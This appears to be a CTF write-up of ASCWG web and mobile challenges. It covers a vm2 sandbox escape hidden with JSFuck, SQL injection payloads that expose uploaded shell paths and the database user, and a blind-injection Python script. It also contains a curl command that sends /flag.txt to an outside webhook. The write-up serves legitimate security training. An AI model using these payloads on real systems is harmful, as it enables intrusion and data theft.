# Getting Started

Hello, today we will go through the web challenges from the wargames, and also a simple mobile challenge as well. So, let’s get started!

**Secure Calc**

![https://cdn-images-1.medium.com/max/800/1*vjfNS9feU5mMqBQPx1CXSA.png](https://cdn-images-1.medium.com/max/800/1*vjfNS9feU5mMqBQPx1CXSA.png)

This challenge was really tricky for me and took a lot of time to bypass the filter, even though it was very easy in the end. But let’s start. The author gave us the source code and also the website link

After we download the source code and open it in VS Code, we will see the following code in `index.js`:

```jsx
const express = require("express");
const {VM} = require("vm2");

const app = express();
const vm = new VM();

app.use(express.json());

app.get('/', function (req, res) {
    return res.send("Hello, just index : )");
});

app.post('/calc',async function (req, res) {
    let { eqn } = req.body;
    if (!eqn) {
        return res.status(400).json({ 'Error': 'Please provide the equation' });
    } 
    else if (eqn.match(/[a-zA-Z]/)) {
        return res.status(400).json({ 'Error': 'Invalid Format' });
    }

    try {
        result = await vm.run(eqn);
        res.send(200,result);
    } catch (e) {
        console.log(e);
        return res.status(400).json({ 'Error': 'Syntax error, please check your equation' });
    }
});

app.listen(3000,'0.0.0.0',function(){
    console.log("Started !")
});

```

As we can see, it’s a small code with just one endpoint, and that’s it, right? From the challenge description saying “Secure and sandboxed,” the first thing I did was to open my Burp Suite and send a POST request to the `/calc` endpoint with the body as below since it's a calculator:

```
{
"eqn":"10+10"
}
```

![https://cdn-images-1.medium.com/max/800/1*wuHtT9gSqZtHq8Q8Dx1u3Q.png](https://cdn-images-1.medium.com/max/800/1*wuHtT9gSqZtHq8Q8Dx1u3Q.png)

We get the output `20`, and everything seems fine so far, nothing special. So, let's go back to the code and see what might be wrong here. The first thing we notice is that it imports the necessary modules:

```
const express = require("express");
const {VM} = require("vm2");
```

After researching `vm2`, we obtained the following information:

- `vm2`: A sandbox that can run **untrusted** code with whitelisted Node's `require` support. Securely executes code in a VM context.

And now we understand why the author said: ‘Secure and sandboxed, but let’s first go through the code:

```
app.post('/calc',async function (req, res) {
    let { eqn } = req.body;
    if (!eqn) {
        return res.status(400).json({ 'Error': 'Please provide the equation' });
    } 
    else if (eqn.match(/[a-zA-Z]/)) {
        return res.status(400).json({ 'Error': 'Invalid Format' });
    }

    try {
        result = await vm.run(eqn);
        res.send(200,result);
    } catch (e) {
        console.log(e);
        return res.status(400).json({ 'Error': 'Syntax error, please check your equation' });
    }
});
```

- The server expects the request body to contain a key `eqn`.
- If `eqn` is not provided, it responds with a `400` status code and an error message: `Please provide the equation`.
- If `eqn` contains any alphabetic characters (a-zA-Z), it responds with a `400` status code and an error message: `Invalid Format`.
- If the equation is valid, it attempts to execute it in the VM sandbox.
- If the equation executes successfully, it returns the result with a `200` status code.
- If there is a syntax error or any other issue during execution, it logs the error to the console and responds with a `400` status code and an error message: `Syntax error, please check your equation`.

As you can see in the code, our inputs are being passed to `vm.run(eqn);` without any filtering, except for a regex check `eqn.match(/[a-zA-Z]/)` that looks for alphabetic characters from a-zA-Z. So, how can we exploit this? The first thing I did was search for a way to bypass the regex check, since without bypassing this, the exploit will not work, right?”

After extensive searching and trying different methods, I found that we can bypass the filter using JSFuck.

JSFuck-encoded code is valid JavaScript, though highly obfuscated. When the `vm.run(eqn)` function is called, `vm2` parses and executes this obfuscated code just like it would with any other JavaScript code.

![https://cdn-images-1.medium.com/max/800/1*L2f0pSYrnttGw4j-32TVpQ.png](https://cdn-images-1.medium.com/max/800/1*L2f0pSYrnttGw4j-32TVpQ.png)

Now we need to look for any available exploits for vm2, and I found this repository: [https://github.com/rvizx/VM2-Exploit](https://github.com/rvizx/VM2-Exploit). While this is exactly what we need, it doesn’t use JSFuck encoding. Therefore, we will need to copy the payload ourselves and edit it using [https://jsfuck.com/](https://jsfuck.com/) Here, we can find the code we need: [https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9](https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9)

```
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('OUR PAYLOAD'); }
            )
        }
    }
};
p.then();
```

Now all we need to do is read the flag located at `/flag.txt`. I tried to get a reverse shell but it didn’t work, so I used a `curl` command to send the flag to our webhook

```
cat /flag.txt | curl -X POST -d @- https://webhook.site/8a47e6ce-1e7d-440e-a513-7fcd4cfc68f1
```

![https://cdn-images-1.medium.com/max/800/1*QQKGVm1dWeikpkbwEBsCjA.png](https://cdn-images-1.medium.com/max/800/1*QQKGVm1dWeikpkbwEBsCjA.png)

![https://cdn-images-1.medium.com/max/800/1*WD-fiyxvw91jRAVo4UnO5g.png](https://cdn-images-1.medium.com/max/800/1*WD-fiyxvw91jRAVo4UnO5g.png)

FLAG: ASCWG{C0c0_WAwaaaa}

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — **Unmasked**

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled.png)

This challenge was really fun because it was supposed to be a black-box CTF challenge. However, my friend discovered while testing that he had access to the `/rr` endpoint, which contained the full code and solutions for the challenge. This was not supposed to happen. Let's first explain the application from a black-box perspective and then examine the source code."

The description of the challenge states that your mission is to read `/flag.txt`. Let’s explore the application and figure out how to accomplish this. When we first open the site link, we encounter a login/registration page

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%201.png)

And after we register and loggin we will see a file upload page 

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%202.png)

When we try to upload a `.php` file, it is uploaded without any issues. However, the problem is that we don't know the path of the uploaded file and how to obtain it.

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%203.png)

I actually got stuck here for a while trying to figure out how to get the path. Since the `/upload` endpoint gives a 403 error, it seems inaccessible. Additionally, while my friend was testing the website, he noticed that when he registered with the same email, username, etc., he encountered the following SQL error:

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%204.png)

So we decided to try some SQL injection and see what happened. Bingo! We encountered an SQL error in the username field:

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%205.png)

At this point, my friend informed me that he had found the source code at [https://unmasked-chall.ascwg-challs.app/rr](https://unmasked-chall.ascwg-challs.app/rr), but unfortunately, it has since been removed and I can’t show you the screenshot. However, we had already downloaded the code, so let’s go through it and discuss the possible attacks.

The source code is quite extensive, so we will focus on the import lines. As you can see in the screenshot below, the usernames are not filtered:

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%206.png)

So, we will focus on this parameter. If we look further down, we see that the author was testing and, in fact, this is how the challenge can be solved easily:

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%207.png)

All we need to do now is copy this payload, for example:

`ghazy', (SELECT version()), '862322e663dff8167bdf30bfeb042906dac0e770')-- -`

and input it into the username field. As the email is reflected on the website, it will give us the database version. For logging in, the password will be the MD5 hash value we enter in the username field, e.g., `862322e663dff8167bdf30bfeb042906dac0e770` = `ghazy`. So, we can log in with the username and password as `ghazy`.

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%208.png)

Now, how do we solve this challenge? It's simple: let's go back to the source code and see what we can extract from it.

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%209.png)

As you can see, after uploading our file upload shell, it is inserted into the `files` table with the column name `file_path`. All we need to do now is use the following SQL payload to list the `file_path` values from the `files` table:

`m5awy3', (SELECT GROUP_CONCAT(file_path) FROM files), '862322e663dff8167bdf30bfeb042906dac0e770')-- -`

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%2010.png)

As you can see, we have retrieved the paths of the uploaded PHP files or any other files. All that remains is to open the file path to access the content and then we were able to list all the files and then read the flag.

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%2011.png)

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%2012.png)

FLAG: ASCWG{How_Did_Youu_G333t_M3}

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 

**Real**

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%2013.png)

This challenge was really challenging for me because I spent about 2-3 hours going down the wrong path because I didn’t read the challenge description carefully. As you can see in the screenshot, it says we need to dump the database user as a proof of concept (PoC), so it’s indeed an SQL injection challenge, right?

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%2014.png)

We will have a basic login page, and as usual, it's a blind SQL injection. Let's try logging in with `' OR 1=1-- -`

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%2015.png)

Yes, it's a blind SQL injection, so we need to find a way to get the database user blindly. After some attempts, we've observed that parentheses `()` and `LIKE` are filtered out. I'm not sure if anything else is filtered, but that's what I've encountered so far

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%2016.png)

Let's start step by step. First, we'll determine how many columns there are by using the query `' ORDER BY 3-- -`. giveing error

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%2017.png)

`' ORDER BY 2-- -` works fine

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%2018.png)

After a lot of searching and trying to bypass the `LIKE` filter keyword, I haven’t found anything useful. However, I remember that there is something similar to `LIKE` in PostgreSQL. But first, let’s confirm if PostgreSQL is the database being used

`'+UNION+SELECT+null,table_name+FROM+information_schema.tables+WHERE+table_name+='pg_user'--`

This query attempts to check the `pg_user` table name from the `information_schema.tables` if it exists. If PostgreSQL is being used and the `pg_user` table is present, we will see `welcome` in the response.

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%2019.png)

Now that we’ve confirmed they are using PostgreSQL, we can use the following payload to get the database user:

`'+UNION+SELECT+NULL,+current_user+FROM+information_schema.columns+WHERE+table_name+%3d+'pg_user'+AND+current_user+SIMILAR+TO+'ASCWG{%25'--`

We used `SIMILAR TO` because `LIKE` is blacklisted, and we chose this payload because parentheses `()` are also blacklisted.

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%2020.png)

Now we need to create a Python script to automate this process. For easier payloads, we can use `test'+or+user+~+'^ASCWG{'--`, which will achieve the same result as the previous payload.

```python
import requests
import string
import time

session = requests.session()

burp0_url = "https://real.ascwg-challs.app:443/login"
burp0_headers = {
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": "\"Not)A;Brand\";v=\"99\", \"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "https://real.ascwg-challs.app",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://real.ascwg-challs.app/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6",
    "Priority": "u=0, i"
}

chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ_}'
flag = "ASCWG{"

while '}' not in flag:
    for c in chars: 
        burp0_data = {"username": f"test' or user ~ '^{flag+c}'--", "password": "test"}
        res = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
        print("Trying", burp0_data)
        if "Welcome" in res.text:
            flag += c
            print("Found", flag)
            break
        time.sleep(2)
```

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%2021.png)

FLAG: ASCWG{YEAH_YOU_DID_IT}
— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 

Lost & found

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%2022.png)

This challenge was quite easy, so to speed things up, I’ll just show you the imported Java code in the application.

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%2023.png)

clearFilesDirectory

```java
/* JADX INFO: Access modifiers changed from: private */
private final void clearFilesDirectory() {
    File[] listFiles = getFilesDir().listFiles();
    if (listFiles != null) {
        for (File file : listFiles) {
            try {
                Intrinsics.checkNotNull(file);
                FilesKt.a(file);
            } catch (IOException e2) {
                e2.printStackTrace();
            }
        }
    }
}
```

- This method clears the files in the app's internal files directory.
- `getFilesDir()` retrieves the directory.

onCrate Method

```java
@Override // e.AbstractActivityC0059i, androidx.activity.k, H.h, android.app.Activity
public final void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    setContentView(R.layout.activity_main);
    BuildersKt__Builders_commonKt.launch$default(CoroutineScopeKt.CoroutineScope(Dispatchers.getIO()), null, null, new a(this, null), 3, null);
}

```

- This method is called when the activity is created.

R Method 

```java
public final void r(String str) {
    char random;
    byte[] bytes = str.getBytes(Charsets.UTF_8);
    Intrinsics.checkNotNullExpressionValue(bytes, "this as java.lang.String).getBytes(charset)");
    String encodeToString = Base64.encodeToString(bytes, 2);
    StringBuilder sb = new StringBuilder();
    for (int i2 = 0; i2 < 10; i2++) {
        random = StringsKt___StringsKt.random("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", Random.INSTANCE);
        sb.append(random);
    }
    String sb2 = sb.toString();
    Intrinsics.checkNotNullExpressionValue(sb2, "toString(...)");
    Charset charset = Charsets.UTF_8;
    byte[] bytes2 = sb2.getBytes(charset);
    Intrinsics.checkNotNullExpressionValue(bytes2, "this as java.lang.String).getBytes(charset)");
    String str2 = getFilesDir().toString() + '/' + Base64.encodeToString(bytes2, 2);
    Intrinsics.checkNotNull(encodeToString);
    try {
        FileOutputStream fileOutputStream = new FileOutputStream(new File(str2));
        try {
            byte[] bytes3 = encodeToString.getBytes(charset);
            Intrinsics.checkNotNullExpressionValue(bytes3, "this as java.lang.String).getBytes(charset)");
            fileOutputStream.write(bytes3);
            Unit unit = Unit.INSTANCE;
            CloseableKt.closeFinally(fileOutputStream, null);
        } finally {
        }
    } catch (IOException e2) {
        e2.printStackTrace();
    }
}
```

- This method encodes a string `str` to Base64 and writes it to a file in the app's files directory.
- The string is first converted to bytes and then encoded to Base64.
- A random string of 10 alphanumeric characters is generated.
- The random string is Base64-encoded and used as part of the file name.
- A `FileOutputStream` writes the Base64-encoded data to a file with the generated name.

So to solve thie challnge we need to read the files before been deleted from `/data/data/com.ascwg2024`

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%2024.png)

And Here The Flag:

![Untitled](Getting%20Started%20f34a798005da4350ab7e171af2b4cb23/Untitled%2025.png)

FLAG: ASCWG{D15C0V3R1NG_H1DD3N_53CR3T5}